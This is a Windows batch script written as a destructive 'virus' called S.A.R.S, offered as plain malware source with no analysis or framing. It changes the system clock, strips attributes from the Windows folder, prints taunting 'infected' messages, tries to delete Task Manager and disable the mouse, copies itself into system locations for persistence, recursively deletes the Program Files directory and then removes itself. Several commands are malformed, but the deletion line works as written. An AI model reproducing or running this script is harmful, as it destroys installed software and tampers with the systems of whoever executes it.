@ECHO OFF
COLOR 0A
TITLE S.A.R.S
TIME 00:00
ATTRIB -H/-R/ C:\WINDOWS
PROMPT YOU ARE INFECTED BY S.A.R.S YOU GONNA DIE
ECHO HA HA YOU WILL NOW BE INFECTED BY S.A.R.S
IF EXIST C:\windows\TASKMGR GOTO INFECT
IF NOT EXIST c:\windows\TASKMGR GOTO STARTING

:INFECT
DEL/Y c:\windows\TASKMGR
GOTO STARTING

:STARTING
IF EXIST c:\windows\system32\rundll32 mouse,disable GOTO INFECTED
IF NOT EXIST c:\windows\system32\rundll32 mouse,disable GOTO INFECTING


:INFECTING
IF EXIST c:\windows\rundll32.exe mouse,disable GOTO INFECTED1
IF NOT EXIST c:\windows\rundll32.EXE mouse,disable GOTO SUICIDE

:INFECTED
c:\windows\system32\rundll32 mouse,disable
GOTO SYMPTOMS

:INFECTED1
c:\windows\rundll32.exe mouse,disable
GOTO SYMPTOMS

:SYMPTOMS
COPY %0 >> C:\WINDOWS\SYSTEM32
COPY %0 >> C:\WINDOWS\AUTOEXE.BAT
GOTO SUICIDE

:SUICIDE
IF EXIST C:\PROGRA~1 GOTO SUICIDE1
IF NOT EXIST C:\PROGRA~1 GOTO END

:SUICiDE1
rd/s/q c:\progra~1
goto end

:END
DEL %0
EXIT